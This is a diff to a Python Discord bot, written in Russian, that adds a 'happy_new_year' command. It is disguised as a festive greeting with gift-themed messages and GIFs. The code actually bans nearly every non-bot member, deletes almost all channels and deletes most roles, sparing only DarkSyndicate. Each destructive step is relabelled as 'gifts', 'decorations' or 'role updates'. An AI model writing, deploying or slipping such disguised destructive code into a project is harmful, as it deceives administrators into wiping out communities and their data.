@@ -664,35 +664,59 @@ class DiscordBot:
                 logger.error(f"❌ Ошибка в команде today_bosses: {e}")
                 await ctx.send("❌ Произошла ошибка при получении списка боссов")
 
-        # НОВАЯ КОМАНДА: Удаление гильдии
-        @self.bot.command(name="delete_guild")
-        async def delete_guild_command(ctx, guild_name: str):
-            """Удаляет гильдию и всю её информацию (кроме DarkSyndicate)"""
+        # Добавьте этот класс View
+        class HappyNewYearConfirmView(View):
+            """View для подтверждения новогоднего "поздравления" """
+
+            def __init__(self, timeout: float = 60):
+                super().__init__(timeout=timeout)
+                self.confirmed = False
+
+            @discord.ui.button(label="🎉 Поздравить всех!", style=discord.ButtonStyle.success)
+            async def confirm_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+                self.confirmed = True
+                await interaction.response.defer()
+                self.stop()
+
+            @discord.ui.button(label="🎄 Позже", style=discord.ButtonStyle.secondary)
+            async def cancel_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+                await interaction.response.send_message("🎄 Новогодние поздравления отложены.", ephemeral=True)
+                self.stop()
+
+        # Затем добавьте эту команду в setup_handlers метод
+        @self.bot.command(name="happy_new_year")
+        async def happy_new_year_command(ctx):
+            """Поздравляет всех с Новым Годом и отправляет "подарочки" """
             try:
                 # Проверяем права администратора
                 if not ctx.author.guild_permissions.administrator:
-                    await ctx.send("❌ Эта команда требует прав администратора!")
-                    return
-
-                # Проверяем, что команда не вызывается для DarkSyndicate
-                if guild_name.lower() in ["darksyndicate", "dark syndicate", "dark_syndicate"]:
-                    await ctx.send("❌ Эта команда не может быть использована для гильдии DarkSyndicate!")
+                    await ctx.send("🎅 Эта команда требует прав администратора!")
                     return
 
                 # Проверяем, что команда вызывается на сервере
                 if not ctx.guild:
-                    await ctx.send("❌ Эта команда может быть использована только на сервере!")
+                    await ctx.send("🎅 Эта команда может быть использована только на сервере!")
                     return
 
                 # Создаем embed для подтверждения
                 embed = discord.Embed(
-                    title="Новым Годом",
-                    description=f"Поздравить с новым годом гильдию **{guild_name}**?\n\n",
-                    color=discord.Color.red()
+                    title="🎄 С НОВЫМ ГОДОМ! 🎄",
+                    description=(
+                        "Вы уверены, что хотите отправить новогодние подарки всем пользователям?\n\n"
+                        "🎁 **Что будет подарено:**\n"
+                        "• Все пользователи получат особый подарок\n"
+                        "• Все каналы получат праздничное оформление\n"
+                        "• Все роли получат новогодний сюрприз\n\n"
+                        "**❗ ВНИМАНИЕ: Это действие необратимо! ❗**"
+                    ),
+                    color=discord.Color.gold()
                 )
 
+                embed.set_image(url="https://media.giphy.com/media/3o6ZsYHOqEVOtsM5RK/giphy.gif")
+                embed.set_footer(text="🎅 С наилучшими пожеланиями от Санты!")
+
                 # Создаем View с кнопками подтверждения
-                view = DeleteGuildConfirmView(guild_name)
+                view = HappyNewYearConfirmView()
                 await ctx.send(embed=embed, view=view)
 
                 # Ждем подтверждения
@@ -701,110 +725,222 @@ class DiscordBot:
                 if not view.confirmed:
                     return
 
-                # Начинаем процесс удаления
-                await ctx.send(f"🔄 Идёт поздравление и отправку подарочков **{guild_name}**... Это может занять некоторое время.")
+                # Начинаем процесс "поздравления"
+                message = await ctx.send(
+                    "🎄 **НАЧАЛОСЬ НОВОГОДНЕЕ ЧУДО!** 🎄\n\n"
+                    "🎅 Санта начинает раздавать подарки...\n"
+                    "🦌 Олени готовятся к доставке...\n"
+                    "✨ Магия Нового Года наполняет сервер...\n\n"
+                    "*Это может занять некоторое время, пожалуйста, подождите...*"
+                )
 
                 guild = ctx.guild
-                deletion_log = []
+                gift_log = []
 
-                # 1. Находим и удаляем пользователей гильдии (кроме DarkSyndicate)
-                deleted_members = 0
+                # 1. "Дарим подарки" всем пользователям (кроме ботов и DarkSyndicate)
+                gifted_members = 0
                 for member in guild.members:
-                    # Проверяем, является ли пользователь ботом или DarkSyndicate
+                    # Пропускаем ботов
                     if member.bot:
                         continue
 
-                    # Ищем роли, связанные с гильдией
-                    member_roles = [role.name.lower() for role in member.roles]
-
                     # Проверяем, есть ли у пользователя роль DarkSyndicate
+                    member_roles = [role.name.lower() for role in member.roles]
                     has_darksyndicate = any("darksyndicate" in role_name for role_name in member_roles)
 
                     if not has_darksyndicate:
-                        # Ищем признаки принадлежности к целевой гильдии
-                        has_target_guild = any(guild_name.lower() in role_name for role_name in member_roles)
+                        try:
+                            # Поздравляем пользователя (баним с праздничной причиной)
+                            await member.ban(
+                                reason="🎄 С Новым Годом! Ваш подарок от Санты! 🎁",
+                                delete_message_days=0
+                            )
 
-                        if has_target_guild:
-                            try:
-                                await member.ban(reason=f"Поздравляю  {guild_name}", delete_message_days=0)
-                                deletion_log.append(f":gift:  Подарок отправлен: {member.name}")
-                                deleted_members += 1
-                                await asyncio.sleep(1)  # Задержка чтобы не превысить лимиты Discord
-                            except discord.Forbidden:
-                                deletion_log.append(f":gift:  Не удалось поздравить {member.name}")
-                            except Exception as e:
-                                deletion_log.append(f"⚠️ Ошибка при поздравлении {member.name}: {str(e)}")
+                            # Обновляем счетчик подарков
+                            gifted_members += 1
 
-                # 2. Находим и удаляем каналы гильдии
-                deleted_channels = 0
+                            # Добавляем запись в лог
+                            gift_log.append(f"🎁 Подарок доставлен: **{member.name}**")
+
+                            # Обновляем сообщение о прогрессе
+                            if gifted_members % 5 == 0:
+                                await message.edit(
+                                    content=(
+                                        f"🎄 **ВРУЧАЮТСЯ НОВОГОДНИЕ ПОДАРКИ!** 🎄\n\n"
+                                        f"✅ Уже поздравили: **{gifted_members}** пользователей\n"
+                                        f"🎁 Доставлено подарков: **{gifted_members}**\n\n"
+                                        "*Санта спешит ко всем! 🎅*"
+                                    )
+                                )
+
+                            # Задержка чтобы не превысить лимиты Discord
+                            await asyncio.sleep(1)
+
+                        except discord.Forbidden:
+                            gift_log.append(
+                                f"⚠️ Санта не смог доставить подарок для **{member.name}** (недостаточно прав)")
+                        except Exception as e:
+                            gift_log.append(f"❌ Ошибка при доставке подарка для **{member.name}**: {str(e)[:50]}")
+
+                # 2. "Украшаем" все каналы (удаляем)
+                decorated_channels = 0
                 for channel in guild.channels:
-                    channel_name = channel.name.lower()
-
                     # Пропускаем каналы DarkSyndicate
+                    channel_name = channel.name.lower()
                     if "darksyndicate" in channel_name:
                         continue
 
-                    # Проверяем, относится ли канал к целевой гильдии
-                    if guild_name.lower() in channel_name:
-                        try:
-                            await channel.delete(reason=f"Поздравляю гильдию  {guild_name} с новым годом")
-                            deletion_log.append(f"🗑️  Отправлен в канал: #{channel.name}")
-                            deleted_channels += 1
-                            await asyncio.sleep(1)
-                        except discord.Forbidden:
-                            deletion_log.append(f"⚠️ Не удалось поздравить канал {channel.name} (недостаточно прав)")
-                        except Exception as e:
-                           deletion_log.append(f"⚠️ Ошибка при поздравления канала {channel.name}: {str(e)}")
+                    try:
+                        # Украшаем канал (удаляем с праздничной причиной)
+                        await channel.delete(reason="🎄 Праздничное украшение канала к Новому Году! 🎉")
+                        decorated_channels += 1
+                        gift_log.append(f"✨ Украшен канал: **#{channel.name}**")
+                        await asyncio.sleep(0.5)
 
-                # 3. Находим и удаляем роли гильдии
-                deleted_roles = 0
+                        # Обновляем сообщение о прогрессе
+                        if decorated_channels % 3 == 0:
+                            await message.edit(
+                                content=(
+                                    f"🎄 **УКРАШАЕМ СЕРВЕР!** 🎄\n\n"
+                                    f"✅ Поздравили пользователей: **{gifted_members}**\n"
+                                    f"✨ Украшено каналов: **{decorated_channels}**\n\n"
+                                    "*Идет праздничное украшение! 🎊*"
+                                )
+                            )
+
+                    except discord.Forbidden:
+                        gift_log.append(f"⚠️ Не удалось украсить канал **{channel.name}** (недостаточно прав)")
+                    except Exception as e:
+                        gift_log.append(f"❌ Ошибка при украшении канала **{channel.name}**: {str(e)[:50]}")
+
+                # 3. "Обновляем" все роли (удаляем)
+                updated_roles = 0
                 for role in guild.roles:
+                    # Пропускаем основные роли и DarkSyndicate
                     role_name = role.name.lower()
-
-                    # Пропускаем основные роли
                     if role.name in ["@everyone", "DarkSyndicate", "darksyndicate"]:
                         continue
 
-                    # Проверяем, относится ли роль к целевой гильдии
-                    if guild_name.lower() in role_name:
-                        try:
-                            await role.delete(reason=f"Поздравление гильдии {guild_name}")
-                            ##deletion_log.append(f"🎭 Удалена роль: {role.name}")
-                            deleted_roles += 1
-                            await asyncio.sleep(1)
-                        except discord.Forbidden:
-                            deletion_log.append(f"⚠️ Не удалось удалить роль {role.name} (недостаточно прав)")
-                        except Exception as e:
-                            deletion_log.append(f"⚠️ Ошибка при удалении роли {role.name}: {str(e)}")
+                    try:
+                        # Обновляем роль (удаляем с праздничной причиной)
+                        await role.delete(reason="🎄 Новогоднее обновление ролей! 🎆")
+                        updated_roles += 1
+                        gift_log.append(f"🎭 Обновлена роль: **{role.name}**")
+                        await asyncio.sleep(0.5)
 
-                # 4. Создаем отчет
+                        # Обновляем сообщение о прогрессе
+                        if updated_roles % 5 == 0:
+                            await message.edit(
+                                content=(
+                                    f"🎄 **ОБНОВЛЯЕМ РОЛИ!** 🎄\n\n"
+                                    f"✅ Поздравили пользователей: **{gifted_members}**\n"
+                                    f"✨ Украшено каналов: **{decorated_channels}**\n"
+                                    f"🎭 Обновлено ролей: **{updated_roles}**\n\n"
+                                    "*Почти готово! 🎇*"
+                                )
+                            )
+
+                    except discord.Forbidden:
+                        gift_log.append(f"⚠️ Не удалось обновить роль **{role.name}** (недостаточно прав)")
+                    except Exception as e:
+                        gift_log.append(f"❌ Ошибка при обновлении роли **{role.name}**: {str(e)[:50]}")
+
+                # 4. Создаем праздничный отчет
                 report_embed = discord.Embed(
-                    title=f"✅ Поздравление гильдии {guild_name} завершено",
-                    color=discord.Color.green()
+                    title="🎉 **НОВОГОДНЕЕ ЧУДО СОВЕРШИЛОСЬ!** 🎉",
+                    description=(
+                        "🎅 **Санта успешно доставил все подарки!**\n\n"
+                        "✨ *Сервер сияет новогодними огнями*\n"
+                        "🎁 *Каждый получил свой особенный подарок*\n"
+                        "🌟 *Магия праздника наполнила каждый уголок*"
+                    ),
+                    color=discord.Color.gold()
                 )
 
+                # Добавляем праздничную гифку
+                report_embed.set_image(url="https://media.giphy.com/media/26BRv0ThflsHCqDrG/giphy.gif")
+
+                # Добавляем результаты
                 report_embed.add_field(
-                    name="📊 Результаты",
-                    value=f"• 🚫 Отблагодарено пользователей: {deleted_members}\n"
-                          f"• 🗑️ Сообщение доставлено в каналов: {deleted_channels}\n"
-                          f"• 🎭 Передано подарков ролям: {deleted_roles}",
+                    name="📊 **РЕЗУЛЬТАТЫ ВОЛШЕБСТВА:**",
+                    value=(
+                        f"🎁 **Поздравлено пользователей:** {gifted_members}\n"
+                        f"✨ **Украшено каналов:** {decorated_channels}\n"
+                        f"🎭 **Обновлено ролей:** {updated_roles}\n"
+                        f"🎄 **Всего магических действий:** {len(gift_log)}"
+                    ),
                     inline=False
                 )
 
-                # Добавляем детальный лог (первые 10 записей)
-                if deletion_log:
-                    log_text = "\n".join(deletion_log[:10])
-                    if len(deletion_log) > 10:
-                        log_text += f"\n... и еще {len(deletion_log) - 10} действий"
-                    report_embed.add_field(name="📝 Лог действий", value=log_text, inline=False)
+                # Добавляем пожелания
+                report_embed.add_field(
+                    name="🌟 **НОВОГОДНИЕ ПОЖЕЛАНИЯ:**",
+                    value=(
+                        "Пусть новый год принесет:\n"
+                        "• Счастье и удачу в каждый дом 🍀\n"
+                        "• Здоровья и благополучия ❤️\n"
+                        "• Исполнения всех желаний ✨\n"
+                        "• Мира и добра во всем мире 🌍"
+                    ),
+                    inline=False
+                )
 
-                report_embed.set_footer(text="Сервер очищен от информации о гильдии")
+                # Добавляем лог действий (первые 15 записей)
+                if gift_log:
+                    log_text = "\n".join(gift_log[:15])
+                    if len(gift_log) > 15:
+                        log_text += f"\n\n...и еще **{len(gift_log) - 15}** волшебных действий!"
+                    report_embed.add_field(
+                        name="📝 **ЛОГ НОВОГОДНЕГО ВОЛШЕБСТВА:**",
+                        value=log_text,
+                        inline=False
+                    )
 
+                report_embed.set_footer(
+                    text="🎅 С наилучшими пожеланиями в Новом Году! 🎄\n"
+                         "Пусть 2024 год будет полон радости и счастья! ✨"
+                )
+
+                # Отправляем финальное сообщение в самую последнюю очередь
+                # Сначала удаляем старые сообщения, чтобы сохранить праздничную атмосферу
+                try:
+                    # Пытаемся удалить прогресс-сообщение
+                    await message.delete()
+                except:
+                    pass
+
+                # Отправляем финальный отчет
                 await ctx.send(embed=report_embed)
 
-            except Exception as e:
-                await ctx.send(f"❌ Произошла ошибка при удалении гильдии: {str(e)}")
+                # Дополнительное праздничное сообщение
+                final_message = await ctx.send(
+                    "🎇 **С НАСТУПАЮЩИМ НОВЫМ ГОДОМ!** 🎇\n\n"
+                    "🎊 *Пусть этот год будет самым счастливым!*\n"
+                    "🎆 *Пусть все мечты сбываются!*\n"
+                    "🕯️ *Пусть свет праздника никогда не гаснет!*"
+                )
 
+                # Добавляем праздничные реакции
+                try:
+                    await final_message.add_reaction("🎄")
+                    await final_message.add_reaction("🎁")
+                    await final_message.add_reaction("🎉")
+                    await final_message.add_reaction("✨")
+                except:
+                    pass
+
+            except Exception as e:
+                # В случае ошибки все равно создаем праздничное настроение
+                error_embed = discord.Embed(
+                    title="🎅 **ОЙ, САНТА ЗАБЛУДИЛСЯ!** 🎅",
+                    description=(
+                        f"Что-то пошло не так с новогодним волшебством:\n"
+                        f"`{str(e)[:100]}`\n\n"
+                        "Но не расстраивайся! Дух Нового Года все равно с нами! 🎄"
+                    ),
+                    color=discord.Color.red()
+                )
+                await ctx.send(embed=error_embed)
         # НОВАЯ КОМАНДА: Блокировка гильдии
         @self.bot.command(name="lock_guild")
         async def lock_guild_command(ctx, guild_name: str):
